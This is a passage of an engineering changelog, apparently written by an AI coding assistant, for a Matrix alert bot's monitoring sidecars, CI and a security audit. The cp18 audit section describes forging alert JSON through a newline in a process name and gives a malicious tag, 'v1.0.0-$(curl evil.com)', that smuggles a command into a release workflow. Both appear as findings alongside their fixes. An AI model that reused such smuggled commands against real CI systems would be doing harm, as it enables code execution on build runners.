- `contact_links` — surfaces `matrix.to/#/@agorise:matrix.org` as the route for security disclosures (visible from the picker UI before any public issue form loads)

`docs/NEW-ISSUE-FOUND.md` and `docs/NEW-ISSUE-FOUND.txt` remain unchanged in the repo as offline/email copies.

### Operator-facing experience after this lands on Forgejo

1. Tester clicks "New Issue" → only "Bug report" template shown in picker, plus a "Security disclosure (private)" link routing to Matrix
2. Clicking "Bug report" auto-fills the comment editor with the full 17-section form
3. Tester fills in what they can, submits
4. Ken copies the resulting issue body, pastes into Claude prompt, fix lands

### Caught discipline violation

My initial `config.yml` comment said "Forgejo (and Gitea) read this file" — `forgejo-not-gitea-smoke.ts` correctly failed the build per memory rule #16.  Reworded to drop the Gitea mention.  The smoke does its job.

### Sentinels + verification

- 2 P121-CP20 sentinels (CP20-1: frontmatter + 17 sections + Matrix mxid in §16; CP20-2: picker config disables blank-issues + has Matrix contact link)
- Triple-pulse 2,886 × 3, 0 failures.  cp19 baseline 2,884 → cp20 baseline 2,886 (+2 net)
- YAML validators confirm both files parse cleanly + the template body retains all 17 numbered sections post-frontmatter-prepending

### Brag list

Zero new entries.  Intake form is internal infrastructure for the beta period, not a public-facing brag.

### Pattern lesson

When memory says something shipped but the repo doesn't have it, verify both — memory may be accurate about the shipment AND the repo may be accurate about the current state (a later refactor lost the file).  Don't assume one source is wrong; check both.

---

## Part 121 cp19 — what's shipped (knock out remaining MEDIUM/LOW audit findings)

### Pretext

cp18 sealed the deep-deep audit, fixed two HIGH findings (AUDIT-1, AUDIT-CI-7), filed MEDIUM/LOW findings in REVISIT.  Ken said "if it won't take too long to fix those last little things, i don't see why they can't just be knocked out now."  cp19 closes all remaining actionable findings.

### Fixes shipped

- **AUDIT-ANSIBLE-1 (MEDIUM) FIXED**: `nodejs.yml` refactored from `setup_X.x` shell script-as-root to apt-repo + GPG-key pattern matching docker/trivy roles.
- **AUDIT-NUMERIC (MEDIUM) FIXED**: `json_num()` helper in `emit.sh` validates numeric values before JSON embed.  Applied to host-monitor disk-path, fail2ban counts, compose restart_count.
- **AUDIT-2 (LOW) FIXED**: `sanitize()` in matrix-bot classifier strips ASCII control chars except `\t`/`\n` from rendered payload values.
- **AUDIT-3 (LOW) FIXED**: `sanitize()` defangs `@user:server` and `#room:server` patterns by inserting U+200D after the sigil — Matrix pill-detection doesn't fire.
- **AUDIT-4 (LOW) FIXED**: `MAX_FIELD_BYTES = 1024` + `MAX_PAYLOAD_BYTES = 8192` caps in renderAlertBody.  Per-field + total truncation with explicit markers.
- **AUDIT-CI-2 (LOW) FIXED partially**: `actions/checkout` + `actions/setup-node` SHA-pinned with version comments.  `actions/upload-artifact` left at `@v4` with explicit TODO — couldn't confirm current upstream SHA from available sources.
- **AUDIT-CI-1 (MEDIUM) NOT ACTIONED by design**: PR-from-fork CI is a reviewer-policy item, not a code fix.

### Regression smoke

`apps/matrix-bot/scripts/render-alert-hardening-smoke.ts` — 8 scenarios covering AUDIT-2/3/4 defenses (ESC strip, NUL/bell/FF strip, tab+newline preservation, mxid defang, room-alias defang, per-field truncation, payload truncation, combined attack).  All pass first try.

### Persona sentinels

5 P121-CP19 sentinels lock all five fixes.

### Brag list

Zero new entries.  Security work goes to AUDIT doc.

### Verification

- Triple-pulse: 2,884 × 3, 0 failures.  cp18 baseline 2,871 → cp19 baseline 2,884 (+13 net: 8 render-hardening + 5 persona).
- Typecheck 0 errors, ansible-lint passes production-profile.

### Honest scope acknowledgment

SHA-pinning would benefit from direct access to action repos for current upstream SHAs.  Sandbox search reliably confirmed 2/3 (checkout, setup-node).  Applied those + explicit TODO on the third.  Better than @v4 tag-pinning all of them.

---

## Part 121 cp18 — what's shipped (deep-deep security audit of cp9-cp17 deltas)

### Pretext

cp17 sealed the schema-as-contract pattern across all 38 indexer-client interfaces.  Ken said "time now for deep deep code and security audits please".  cp18 is a black-hat walk through every cp9-cp17 attack surface.

### TWO HIGH-SEVERITY findings FIXED

**AUDIT-1: JSON-injection via control characters in `json_str()`**

Unprivileged user could spawn a process with `comm` name = `legitname\n{evil-json}` (via `exec -a $'...'` or `prctl PR_SET_NAME`), trigger OOM-kill, kernel logged the `comm` to dmesg, `morphit-dmesg-monitor.sh` passed it through pre-fix `json_str()` (which only escaped `\\` and `"`), `systemd-cat` split at the embedded newline into TWO journal entries — the second being attacker-controlled forged JSON.  matrix-bot parsed the forged record as a legitimate alert.

Impact: alert spoofing (DOS the operator's pager with fake CRITICALs → habituation), audit-log poisoning.  Same vector affected compose service names, third-party-repo package names, hostile FUSE mount paths.

Fix: `json_str()` rewritten with `sed -z` (so newlines stay in pattern space; default `sed` reads line-by-line so `s/\x0a/.../g` never matched — was the root cause of the initial fix attempt not working) to encode every C0 control char per RFC 8259 §7.  Regression smoke `apps/matrix-bot/scripts/json-str-injection-smoke.ts` — 11 scenarios feeding known-malicious inputs through `json_str()` and validating round-trip via `JSON.parse`.  Caught two bugs in initial fix attempt.

**AUDIT-CI-7: tag-name command injection in `release.yml`**

`${{ steps.ver.outputs.tarball }}` was substituted directly into bash `run:` blocks.  Forgejo Actions expands `${{}}` BEFORE bash parses; `git-check-ref-format` allows `$ ( )` and spaces in tag names.  A malicious tag like `v1.0.0-$(curl evil.com)` would execute the command substitution on the release-builder CI runner.

Fix: (1) strict tag-format validation step before any use (case-glob shape + char-class rejection — only `[A-Za-z0-9.-]` allowed); (2) pass `TARBALL` via `env:` not `${{}}` interpolation in subsequent steps.

### MEDIUM/LOW findings FILED IN REVISIT (not fixed this turn)

- **AUDIT-CI-1** (MEDIUM): `pull_request:` runs PR code on CI runner; standard open-source threat model
- **AUDIT-ANSIBLE-1** (MEDIUM): NodeSource setup script runs as root unverified; refactor to apt-repo+GPG pattern
- **AUDIT-NUMERIC** (MEDIUM): some sidecar numeric fields embedded unquoted; hostile FUSE could break JSON → alert suppression (not RCE)
- **AUDIT-2** (LOW): ANSI escape sequences in raw_line plain-text path
- **AUDIT-3** (LOW): Matrix mxid mention injection in raw_line
- **AUDIT-4** (LOW): matrix-bot doesn't cap payload size
- **AUDIT-CI-2** (LOW): third-party actions pinned by major version, not SHA

### Brag list

Zero new entries.  Security findings go to the AUDIT doc, not the brag list.

### Verification

- Triple-pulse: 2,871 × 3, 0 failures.  cp17 baseline 2,857 → cp18 baseline 2,871 (+14 net: 11 json-str-injection + 3 persona).
- Typecheck-sweep: 0 errors across all 9 workspaces.
- AUDIT-1 fix: 11/11 attack payloads round-trip correctly through `json_str()`.
- AUDIT-CI-7 fix: `release.yml` parses as valid YAML; validation step uses POSIX-shell case-glob + char-class rejection.
- envelope-smoke (24 checks) continues to pass — fix is backwards-compatible for valid inputs.

### Pattern lessons

1. **RFC 8259 §7 requires ALL C0 control chars escaped**, not just `\\` and `"`.
2. **`sed` is line-oriented by default**; use `sed -z` to keep newlines in pattern space.
3. **`${{}}` expansion in workflow `run:` blocks is shell-injection-equivalent**; pass via `env:` instead.
4. **Git tag names accept `$ ( )` and spaces**; validate strictly before shell interpolation.
5. **Write the regression smoke for each fix**.  The cp18 json-str smoke caught two bugs in the fix attempt before final form.

### Pending — NOT cp18 SCOPE

- Live full-stack Ansible test against fresh Ubuntu 24.04 VM (needs Ken's hardware)
- Trigger `release.yml` with a real tag push (and a malformed-tag push to verify validation fails)
- Apply MEDIUM findings: AUDIT-ANSIBLE-1, AUDIT-NUMERIC, AUDIT-CI-1
- Apply LOW findings: AUDIT-2, AUDIT-3, AUDIT-4, AUDIT-CI-2

---

## Part 121 cp17 — what's shipped (final indexer-side schema-coverage completion)

### Pretext

cp16 sealed SSE-stream shape smoke + REST expanded to 27 interfaces.  Ken said "finish this up PLEASE".  cp17 closes the indexer-side coverage gap.

### What shipped

api-response-shape-smoke expanded from 27 → ALL 38 @morphit/indexer-client response types.  76 checks total (38 valid-parse + 38 reject-invalid).  Final additions: ClearingPricePoint, ClearingPriceHistoryResponse, BatchProfilesResponse, FeedbackRecord (with literal-union `rating: 1|2|3|4|5`), FeedbackResponseRecord, AccountFeedback{,Given}Response, ChatReadStateEntry/Response, AttestorEligibilityResponse, StrangerFeeQuoteResponse.

2 P121-CP17 persona sentinels.  Zero new brag entries (internal contract-hardening, per discipline).

Relay-side ad-hoc JSON responses deferred — they need a shared types package first.

### Campaign status

Part 121 audit campaign comprehensive across THREE IO surfaces:
- bash sidecar emit (cp14 envelope-smoke)
- HTTP REST responses (cp15-17 api-response-shape, 38 interfaces)
- SSE event streams (cp16 sse-stream-shape, 3 streams)

Same architectural pattern across all three: zod schema + TS satisfies cross-check + negative-test invalidator.

Matrix-bot ecosystem feature-complete: 12 monitoring sidecars, three-tier classifier with ELI5 advice, one-command Ansible deploy, CI workflow runs typecheck+lint+smokes on every push, tag-push release workflow.

### Verification

- Triple-pulse: 2,857 × 3, 0 failures.  cp16 baseline 2,833 → cp17 baseline 2,857 (+24 net).
- Typecheck-sweep: 0 errors across all 9 workspaces.
- ansible-lint at production-profile strictness: passes.

### Pending — NOT cp17 SCOPE

- Live full-stack Ansible test against fresh Ubuntu 24.04 VM (needs Ken's hardware)
- Trigger `.forgejo/workflows/release.yml` with a real tag push
- Extract `@morphit/relay-client` package + apply schema-as-contract pattern
- Defense-in-depth: extract indexer-client schemas into a shared package consumed by BOTH smoke AND indexer handlers

---

## Part 121 cp16 — what's shipped (SSE-stream shape smoke + expanded REST-API coverage)

### Pretext

cp15 sealed API-response zod smoke + emit.sh lib refactor + host-monitor mount sweep + smartctl SCT thermal-log scraper.  Ken said "continue with what you were working on, without delay".  cp16 ships the remaining tractable items from cp15's REVISIT.

### What shipped

**Phase 1 — SSE-stream shape smoke:**

`apps/matrix-bot/scripts/sse-stream-shape-smoke.ts` (18 scenarios across 3 streams).  Validates the wire-format shapes of `/v1/orderbook/stream`, `/v1/instances/stream`, and `/v1/chat/:a/:b/stream`.  Each event-type payload gets a zod schema and a `satisfies` cross-check against the canonical TS interface from @morphit/indexer-client.

SSE matters more than REST because wire-format drift breaks every connected EventSource simultaneously.

**Phase 2 — Expanded REST-API schema coverage:**

api-response-shape-smoke expanded from 10 interfaces to **27**.  Added OrderViews, Orderbook (paged), Featured slots, Account orders, Profiles, Operator stats, Chat identity, Conversations, Blocks, Chat history, Instance directory paged responses.  54 REST checks total.

**Phase 3 — Brag list discipline:**

Zero new entries.  All cp16 work is internal contract-hardening; per the cp14 memory rule, no public-facing brag.

### Verification

- Triple-pulse: 2,833 × 3, 0 failures.  cp15 baseline 2,778 → cp16 baseline 2,833 (+55 net).
- Typecheck-sweep: 0 errors across all 9 workspaces.
- ansible-lint at production-profile strictness: passes.

### Pending — NOT cp16 SCOPE

- Live full-stack Ansible test against fresh Ubuntu 24.04 VM (needs Ken's hardware)
- Trigger `.forgejo/workflows/release.yml` with a real tag push
- Add schemas for the remaining ~13 lower-traffic response types
- Consider extracting schemas into a shared package for indexer-side runtime validation

---

## Part 121 cp15 — what's shipped (API-response zod smoke + emit.sh lib refactor + host-monitor mount sweep + smartctl SCT thermal-log)

### Pretext

cp14 sealed envelope-smoke + cross-workspace deps-pin + systemd/journald sidecars + tag-push release workflow + brag-list discipline correction.  Ken said "alright, continue".  cp15 ships the highest-leverage remaining items from cp14's REVISIT.

### What shipped

**Phase 1 — API-response zod schemas:**

`apps/matrix-bot/scripts/api-response-shape-smoke.ts` (20 scenarios).  Extends the envelope-smoke pattern from sidecars to HTTP API: zod schemas for 10 representative @morphit/indexer-client response shapes (HealthResponse, ListingFeeResponse, ReleaseResponse, ErrorResponse, OperatorRecord, InstanceResponse, InstanceDirectoryEntry, OrderRecord, FeedbackSummary, ChatAdmissionResponse).

Each scenario has TS-type-cross-check via `satisfies` clause on a sample literal — drift between zod schema and TS interface fails typecheck, not just runtime.  Each also includes a negative-test invalidator.

**Phase 2 — Shared emit() lib:**

`ops/scripts/lib/emit.sh` — extracted iso_now()/json_str()/emit() from all 12 sidecars.  Each sidecar now sources via `. "$(dirname "$0")/lib/emit.sh"` + sets MORPHIT_EMIT_MODULE/MORPHIT_EMIT_TAG vars.  **Removed ~180 lines of duplicate boilerplate.**  Envelope-smoke confirms all 12 still emit correctly post-refactor.

**Phase 3 — Host-monitor mount sweep:**

Extended host-monitor with `df --output=target,pcent,fstype` sweep covering all writable filesystems beyond `MORPHIT_HOST_DISK_PATHS`.  Three new events (mount_critical/warn/info) catch Docker volumes filling, runaway tmpfs, bind-mounts the operator-configured paths miss.  Skips pseudo-fs (proc/sysfs/cgroup/squashfs/etc.) — squashfs explicitly to avoid false-positive 100% from read-only /snap/* mounts.

**Phase 4 — Smartctl SCT thermal-log scraper:**

Extended smartctl-monitor with `smartctl -l scttempsts` scraping.  Two new WARN events: temperature_sustained_high (drive hit WARN+ at least once in lifetime) and temperature_overlimit_count (drive firmware itself flagged thermal stress).

**Phase 5 — Classifier extension:**

1 new CRITICAL + 3 new WARN matchers + 5 ALERT_COPY entries.  classifier-smoke +5 scenarios.

**Phase 6 — Persona sentinels:**

5 new P121-CP15 sentinels.  8 stale CP10/CP11 sentinels migrated from grepping `"module":"X"` literal text (post-refactor, no longer present) to the new constructor pattern `MORPHIT_EMIT_MODULE="X"`.

**Phase 7 — Brag list discipline application:**

Per memory rule: no new entries for internal plumbing.  Two small refinements: entry 225 (resource alerts) + one clause about bind-mount/tmpfs sweep; entry 227 (disk health + RAID) + one clause about SCT thermal-log scraper.  Closing summary unchanged at 265.

### Verification

- Triple-pulse: 2,778 × 3, 0 failures.  cp14 baseline 2,748 → cp15 baseline 2,778 (+30 net).
- Typecheck-sweep: 0 errors across all 9 workspaces.
- ansible-lint at production-profile strictness against 53 files: passes.
- Mount sweep + SCT extension live-tested with mocked tools.

### Pending — NOT cp15 SCOPE

- Live full-stack Ansible test against fresh Ubuntu 24.04 VM (needs Ken's hardware)
- Trigger `.forgejo/workflows/release.yml` with a real tag push
- Add zod schemas for the remaining ~30 response types in @morphit/indexer-client
- Apply schema-as-contract pattern to the orderbook SSE stream

---

## Part 121 cp14 — what's shipped (envelope-schema validator + workspace deps-pin + systemd/journald sidecars + release workflow + brag list discipline)

### Pretext

cp13 sealed CI + cp13 sidecars + deps-pin.  Ken said "keep goin'".  cp14 ships the highest-leverage remaining items from cp13's REVISIT.

### What shipped

**Phase 1 — Cross-language drift gap closed:**

`apps/matrix-bot/scripts/sidecar-envelope-smoke.ts` — 24 scenarios.  Captures every bash sidecar's emit() output with mocked systemd-cat, validates against a zod schema matching the canonical `LogRecord` TypeScript interface.  Locks down the bash-emits-JSON / TS-consumes-JSON contract; cp9's drift bug class can no longer recur silently.

Also greps each script's emit() pattern for event-name lowercase_snake conformance.

**Phase 2 — Cross-workspace deps-pin:**

`apps/ops-cli/scripts/workspace-deps-pin-check.ts` — generalizes cp13's matrix-bot-only deps-pin to ALL workspaces.  27 deps tracked across 8 workspaces.

**Phase 3 — Two more monitor sidecars:**

| Script | Module | Cadence | Events |
|---|---|---|---|
| `ops/scripts/morphit-systemd-monitor.sh` | `systemd` | 5min | 4 events: unit health + restart loops + config drift |
| `ops/scripts/morphit-journald-monitor.sh` | `journald` | daily 06:00 UTC | 4 events: journal disk usage + rotation health |

**systemd-monitor** is critical complement to journalctl-based alerting: a unit that fails to even start emits NO journal output for the bot to route.

**journald-monitor** catches "journal silently grew to 8 GB over six months" — operators usually find out only when disk is full.

4 new systemd unit files.  Classifier extended with 2 new CRITICAL + 4 new WARN + 8 ALERT_COPY entries.  classifier-smoke +9 scenarios.

Bot default `JOURNALCTL_UNITS` now covers **14 units**.

Two new Ansible roles.  Structural-smoke const expanded 11 → 13.

**Phase 4 — Tag-push release workflow:**

`.forgejo/workflows/release.yml` — fires on `v*` tag push.  Runs full validation gate then builds + signs (SHA-256) a release tarball, uploaded as artifact.

**Phase 5 — Brag list discipline correction:**

Ken called out long-windedness from cp9-cp13 entries.  Memory now stores: concise (2-4 sentences), themed-position (not appended), skip internal plumbing.

Applied retroactively: 14 bloated cp9-13 entries consolidated into **8 concise** entries placed in Section 18 (Operator setup) right after the threat-model entry.  Internal plumbing (CI workflow, ansible-lint, structural-smoke, deps-pin, envelope-smoke, release.yml) DROPPED from brag list — those belong in AUDIT.

Closing summary count 271 → **265**.

### Verification

- 5-pulse: 2,748 × 5, 0 failures.  cp13 baseline 2,676 → cp14 baseline 2,748 (+72 net).  Strengthened from triple-pulse this checkpoint because envelope-smoke caught a real schema-regex bug on first end-to-end run (host-monitor emits kebab-case `module:"host-resource"`; first schema version forbade hyphens — schema was too strict; fixed to allow lowercase-kebab for module names while keeping event names strict snake_case).  5x clean confirms the fix landed properly, not a transient flake.
- Typecheck-sweep: 0 errors across all 9 workspaces.
- ansible-lint at production-profile strictness against 53 files: passes.

### Pending — NOT cp14 SCOPE

- Live full-stack Ansible test against fresh Ubuntu 24.04 VM (still needs Ken's hardware)
- smartctl SCT thermal log scraper
- bind-mount + tmpfs usage monitor extension
- API-response zod schemas (extend envelope-smoke pattern)
- Extract emit() helper into `ops/scripts/lib/emit.sh` for DRY across 12 scripts
- Trigger `.forgejo/workflows/release.yml` with a real tag push

---

## Part 121 cp13 — what's shipped (Forgejo CI workflow + deps-pin-check + certbot/apt/compose monitor sidecars)

### Pretext

cp12 sealed the ansible quality gates + 3 more monitor sidecars.  Ken said "do it to it" pointing at cp12's REVISIT.  cp13 ships the CI workflow + deps-pin smoke + 3 more sidecars closing the remaining alerting blind-spots.

### What shipped

**Phase 1 — Forgejo CI workflow:**

`.forgejo/workflows/ci.yml` with three parallel jobs on every push and PR:
1. **typecheck** — `npm ci --ignore-scripts` + typecheck-sweep
2. **ansible-lint** — installs lint + collections, runs `ansible-lint --offline --strict`
3. **smokes** — full `npm ci` + `bash scripts/run-smokes.sh` × 3 (triple-pulse)

Concurrency cancel-in-progress saves CI minutes on amend cycles.  GitHub-Actions-compatible syntax.

**Phase 2 — matrix-bot deps-pin-check smoke:**

`apps/matrix-bot/scripts/deps-pin-check.ts` (3 scenarios) compares declared semver ranges in apps/matrix-bot/package.json against installed versions in node_modules.  Tracks matrix-bot-sdk + better-sqlite3 + zod.  Catches the "tested 0.7.1, deployed 0.8.0" class of bug.  Soft-skips if node_modules empty.

**Phase 3 — Three more monitor sidecars:**

| Script | Module | Cadence | Events |
|---|---|---|---|
| `ops/scripts/morphit-certbot-monitor.sh` | `certbot` | daily 04:30 UTC | 4 events: TLS expiry + renewal-stall |
| `ops/scripts/morphit-apt-monitor.sh` | `apt` | daily 05:00 UTC | 4 events: pending security updates |
| `ops/scripts/morphit-compose-monitor.sh` | `compose` | 5min | 4 events: Docker Compose health |

**certbot-monitor** is the standout — it catches the killer "renewal silently broke months ago" pattern by correlating cert expiry against the most recent successful renewal in `/var/log/letsencrypt/letsencrypt.log`.  Most monitoring stacks miss this.

6 new systemd unit files (.service + .timer per sidecar) with hardened postures.  Daily timers use `RandomizedDelaySec` (1h, 2h) for load spreading.

**Classifier extended:** 5 new CRITICAL + 3 new WARN matchers + 12 ALERT_COPY entries.  classifier-smoke +12 scenarios.

**Bot default `MORPHIT_MATRIX_BOT_JOURNALCTL_UNITS`** now covers all 11 monitor sidecars + indexer + relay = **12 units**.

**Three new Ansible roles + playbook + group_vars wiring.**

**Structural smoke OPTIONAL_SIDECAR_ROLES const expanded 5 → 11** — retroactively covers cp12 sidecars that were only being checked for "declared role exists" before.  Smoke scenario count: 37 → 61.

**5 P121-CP13 persona sentinels** pinning every invariant.

**Docs:** OPERATIONS.md §16 extended with three new monitoring subsections; RUN-A-MORPHIT-NODE.md §11 extended; MORPHIT-BRAG-LIST entries #268-271; closing summary 267 → 271.

### Verification

- Triple-pulse: 2,676 × 3, 0 failures.  cp12 baseline 2,635 → cp13 baseline 2,676 (+41 net).
- Typecheck-sweep: 0 errors across all 9 workspaces.
- ansible-lint at production-profile strictness against 49 files: passes 0 failures.
- All three new bash sidecars live-tested.
- CI YAML validates parses cleanly.

### Pending — NOT cp13 SCOPE

- Live full-stack Ansible test against fresh Ubuntu 24.04 VM (still needs Ken's hardware)
- smartctl SCT thermal log scraper (temperature trends)
- bind-mount + tmpfs usage monitor extending host-monitor
- Generalize deps-pin-check to other workspaces
- systemd service health-check sidecar
- journald disk-usage monitor
- `.forgejo/workflows/release.yml` for tag-push tarball builds
- zod schema validator for LogRecord envelope shape

---

## Part 121 cp12 — what's shipped (ansible-lint integration + ansible-structural smoke + dmesg/trivy/postfix monitor sidecars)

### Pretext

Ken said "do as much of that as you can" pointing at cp11's REVISIT pending list.  cp12 ships: (1) ansible-lint integration with all 33 violations fixed; (2) two new tsx smokes catching playbook drift; (3) three more monitoring sidecars closing different alerting blind-spots (kernel-log, Docker CVE rescan, postfix queue depth).

### What shipped

**Phase 1 — ansible-lint integration:**

Installed ansible-lint 26.4.0.  Initial run reported 33 violations.  All fixed:

| Category | Count | Resolution |
|---|---|---|
| `name[casing]` | 10 | Capitalize handler names across 5 sidecar roles |
| `partial-become[task]` | 8 | Add `become: true` companion before `become_user:` in morphit/postgres roles |
| `var-naming[no-role-prefix]` | 8 | Rename register vars to use role-name prefix (f2bclient → fail2ban_monitor_client_path etc.) |
| `yaml[line-length]` | 4 | `.ansible-lint` config skip_list for line-length |
| `command-instead-of-{module,shell}` | 2 | Pre-existing; left as-is |
| `syntax-check[unknown-module]` | 1 | Ship `collections/requirements.yml` declaring community.general/postgresql/docker |

Final: `Passed: 0 failure(s)... 'production' profile passed.` — passes the stricter production profile.

**Phase 2 — Quality-gate smokes:**

- `apps/ops-cli/scripts/ansible-structural-smoke.ts` (37 scenarios) — every declared role has tasks/main.yml; every optional sidecar gated `default(false)`; standard 6 base roles present; handler names capitalized; requirements.yml declares needed collections; no orphan dirs.
- `apps/ops-cli/scripts/ansible-lint-smoke.ts` — runs `ansible-lint --offline --strict`; soft-skips if not installed.

Both registered in `scripts/run-smokes.sh` — same triple-pulse discipline as TypeScript code.

**Phase 3 — Three more monitoring sidecars:**

Same emit-via-systemd-cat pattern.

| Script | Module | Cadence | Events |
|---|---|---|---|
| `ops/scripts/morphit-dmesg-monitor.sh` | `dmesg` | 5min | 8 events: OOM/oops/panic/MCE/segfaults |
| `ops/scripts/morphit-trivy-monitor.sh` | `trivy` | daily 03:00 UTC | 5 events: Docker image CVE scan |
| `ops/scripts/morphit-postfix-monitor.sh` | `postfix` | 15min | 4 events: mail queue depth/age |

6 new systemd unit files (.service + .timer per sidecar) with hardened postures.  All live-tested.

**Classifier extended:** 8 new CRITICAL + 5 new WARN matchers + 17 ALERT_COPY entries with ELI5 advice + copy-pastable debug commands.  classifier-smoke +17 scenarios.

**Bot default `MORPHIT_MATRIX_BOT_JOURNALCTL_UNITS`** now covers indexer + relay + 6 monitor sidecars = 8 units.  Alerts route automatically.

**Three new Ansible roles + playbook + group_vars wiring:**

- `dmesg_monitor` — simplest (no env, no install)
- `trivy_monitor` — installs trivy + jq from Aqua Security apt repo
- `postfix_monitor` — asserts postqueue exists; does not install postfix (operator's job per §37.14)

playbook.yml gains 3 new opt-in role invocations.  group_vars/all.yml gains 3 new `enable_*` flags + tuning vars + outbound destinations for trivy CVE DB.

**4 P121-CP12 persona sentinels** pinning every invariant.

**Docs:**

- OPERATIONS.md §16 extended with three new monitoring subsections.
- RUN-A-MORPHIT-NODE.md §11 extended.
- MORPHIT-BRAG-LIST entries #264-267; closing summary 263 → 267.

### Verification

- Triple-pulse: 2,635 × 3, 0 failures.  cp11 baseline 2,573 → cp12 baseline 2,635 (+62 net).
- Typecheck-sweep: 0 errors across all 9 workspaces.
- ansible-lint at production-profile strictness: passes.
- All three new bash sidecars live-tested.

### Pending — NOT cp12 SCOPE

- Live full-stack Ansible test against fresh Ubuntu 24.04 VM (needs Ken's hardware).
- smartctl SCT thermal log scraper, bind-mount usage, Docker Compose health-check, certbot renewal-failure detector, system-update-pending count.
- Forgejo CI workflow yaml shipping the smoke runs.
- matrix-bot-sdk version pin check.

---

## Part 121 cp11 — what's shipped (npm install + 2 real typecheck bug fixes + extended monitoring sidecars + Ansible playbook landed in repo)

### Pretext

cp10 sealed the host-resource monitor.  Ken approved three follow-up items: (1) npm install for matrix-bot, (2) extended monitoring sidecars (smartctl/fail2ban/mdadm), (3) Ansible playbook update.  cp11 ships all three.

### What shipped

**Phase 1 — npm install + 2 real bugs fixed:**

198 packages installed via `npm install --workspaces --ignore-scripts`.  Native better-sqlite3 build needs nodejs.org (sandbox can't reach; documented as deploy-box requirement in OPERATIONS.md).  Two real typecheck bugs that the cp9 noise filter had been hiding became visible and were fixed:

1. `RustSdkCryptoStoreType.Sqlite` — const-enum access under TS isolatedModules is forbidden.  The 2nd arg to `RustSdkCryptoStorageProvider` is optional anyway; drop it.
2. `client.crypto.prepare()` — needs `roomIds: string[]` arg.  Pass `[]`; DM rooms get auto-created on first send.

Both would have crashed the bot at runtime on first boot.  matrix-bot-sdk + better-sqlite3 removed from `scripts/typecheck-sweep.sh` NOISE_PATTERNS so future bugs aren't hidden.

**Phase 2 — three extended monitoring sidecars:**

Same emit-via-systemd-cat pattern as cp10's host-monitor.  Each is opt-in.

| Script | Module | Cadence | Events |
|---|---|---|---|
| `ops/scripts/morphit-smartctl-monitor.sh` | `smartctl` | 6h | 6 events (3 CRITICAL, 3 WARN, 1 INFO) |
| `ops/scripts/morphit-fail2ban-monitor.sh` | `fail2ban` | 5min | 5 events (2 CRITICAL, 2 WARN, 1 INFO) |
| `ops/scripts/morphit-mdadm-monitor.sh` | `mdadm` | 15min | 3 events (2 CRITICAL, 1 INFO) |

Six new systemd unit files (.service + .timer per sidecar) with hardening matching indexer/relay posture.

**Classifier extended:** 7 new CRITICAL matchers + 5 new WARN matchers + 15 new ALERT_COPY entries with ELI5 advice + copy-pastable debug commands.  classifier-smoke +15 scenarios.

**Bot default `MORPHIT_MATRIX_BOT_JOURNALCTL_UNITS`** updated to include all three cp11 units — alerts route automatically.

**Phase 3 — Ansible playbook landed in repo at `ops/ansible/`:**

The cp8 morphit-ansible tarball moved into the repo.  Five new opt-in roles added:

- `matrix_bot` (cp9) — deploys the matrix-bot sidecar.  CRITICALLY: explicitly checks for the compiled better-sqlite3 .node binary after npm install and fails with a clear recovery command if missing — catches the deploy-box-can't-reach-nodejs.org failure mode.
- `host_monitor` (cp10) — deploys the host-resource sidecar.
- `smartctl_monitor` (cp11) — installs smartmontools + deploys the smartctl sidecar.
- `fail2ban_monitor` (cp11) — deploys the fail2ban observability sidecar.  Per-jail threshold overrides via Jinja2-rendered env vars.
- `mdadm_monitor` (cp11) — deploys the RAID sidecar.

`group_vars/all.yml` extended with `enable_*: false` defaults + per-sidecar tuning vars + nodejs.org / registry.npmjs.org in `outbound_allowed_destinations`.  `vault.yml.example` extended with matrix-bot access token slot.  `README.md` extended with Optional sidecars subsection.  All YAML validates parses cleanly.

**7 P121-CP11 persona sentinels** pinning every invariant.

**Docs (cross-doc grep up front per cp8 discipline):**

- OPERATIONS.md §16 extended with three new monitoring subsections (smartctl, fail2ban, mdadm) + Ansible deployment subsection + matrix-bot setup updated with explicit npm install step calling out better-sqlite3 native build prereqs.
- RUN-A-MORPHIT-NODE.md §11 extended with Extended monitoring + Ansible quick-start subsections.
- MORPHIT-BRAG-LIST entries #260-263 (smartctl, fail2ban, mdadm, Ansible); closing summary 259 → 263.

### Verification

- Triple-pulse: 2,573 × 3, 0 failures.  cp10 baseline 2,551 → cp11 baseline 2,573 (+22 net).
- Typecheck-sweep: 0 errors across all 9 workspaces with STRICTER filter (matrix-bot-sdk + better-sqlite3 no longer noise-suppressed).
- All three new bash sidecars live-tested in sandbox with mocked systemd-cat — valid LogRecord-envelope JSON.
- All Ansible YAML parses cleanly via `python3 yaml.safe_load_all`.

### Pending — NOT cp11 SCOPE

- Live full-stack Ansible test against fresh Ubuntu 24.04 VM (needs Ken's hardware).
- ansible-lint CI integration.
- Smoke runner verifying every role in playbook.yml has a directory + tasks/main.yml.
- Future extended monitoring: dmesg-parser (kernel panics, OOM-killer audit), smartctl SCT thermal log scraper, postfix queue depth, Docker image vulnerability rescan.

---

## Part 121 cp10 — what's shipped (host-resource monitor sidecar + classifier real-event-name rewrite)

### Pretext

cp9 sealed the matrix-bot work.  Ken caught three corrections in the same session: placeholder confusion (`@agorise-relay` is a fake account), number accuracy (cp9's `{count}/{ceiling}` template referenced a field the emitter doesn't actually carry), and a request to build host-resource alerts (disk/CPU/memory/swap thrashing) immediately as cp10.

While verifying #2 I discovered cp9's classifier was using fabricated event names + payload keys throughout — the actual logger emit shape (apps/{indexer,relay}/src/log/index.ts) is `{ts, level, module, event, context, error?}` with payload nested in `context`, and event names are lowercase_with_underscores not uppercase.  cp10 ships the full correction plus the requested host-resource sidecar.

### What shipped

**Host-resource sidecar (3 new files):**

- `ops/scripts/morphit-host-monitor.sh` — POSIX-sh, polls /proc/meminfo + df + /proc/loadavg + /proc/vmstat, emits structured JSON via `systemd-cat -t morphit-host-monitor` in the exact LogRecord envelope the bot expects.  15 distinct event names across 5 resource categories.  Three tiers per category (INFO/WARN/CRITICAL), all env-tunable.  Swap-thrashing detected via delta tracking of /proc/vmstat pswpin/pswpout between runs (state file at /var/lib/morphit-host-monitor/last-vmstat).  Live-tested with mocked systemd-cat — output passes `python3 -m json.tool` cleanly.
- `ops/systemd/morphit-host-monitor.service` — Type=oneshot, runs as `morphit-host-monitor` system user, hardened (ProtectSystem=strict, NoNewPrivileges, PrivateNetwork=true since /proc-only, SystemCallFilter=@system-service ~@privileged @resources).  EnvironmentFile=- (optional).
- `ops/systemd/morphit-host-monitor.timer` — OnBootSec=30s, OnUnitActiveSec=5min.  Opt-in: operator must `systemctl enable --now morphit-host-monitor.timer`.

**Thresholds (defaults):**

| Resource | INFO | WARN | CRITICAL |
|---|---|---|---|
| Disk usage % | >70 | >85 | >95 |
